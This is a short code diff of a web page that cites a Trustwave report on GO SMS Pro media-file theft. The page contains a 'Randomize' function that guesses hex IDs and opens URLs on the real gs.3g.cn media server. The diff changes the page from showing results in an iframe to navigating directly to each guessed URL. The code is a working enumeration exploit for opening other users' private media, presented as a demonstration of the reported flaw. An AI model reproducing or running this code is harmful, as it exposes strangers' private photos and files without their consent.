@@ -14,7 +14,6 @@
                 href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/go-sms-pro-vulnerable-to-media-file-theft/"
                 target="_blank">Trustwave Report</a></p>
         <button onClick=generate() style="display: block; margin: 20px auto;">Randomize</button>
-        <iframe src="demo_iframe.htm" id='iframe' style="max-height: 1200px; max-width: 500px; height: 70vh; width: 50vw; margin: auto; display: block;"></iframe>
     </div>
 </head>
 
@@ -24,10 +23,8 @@
             var hex = Math.floor(Math.random() * 15106600).toString(16);
             var url = `http://gs.3g.cn/D/${hex}/w`;
             console.log(url);
-            document.getElementById('iframe').src = url;
+            window.location.href = url;
         }
-        //run on first page load
-        generate();
     </script>
 </body>
 
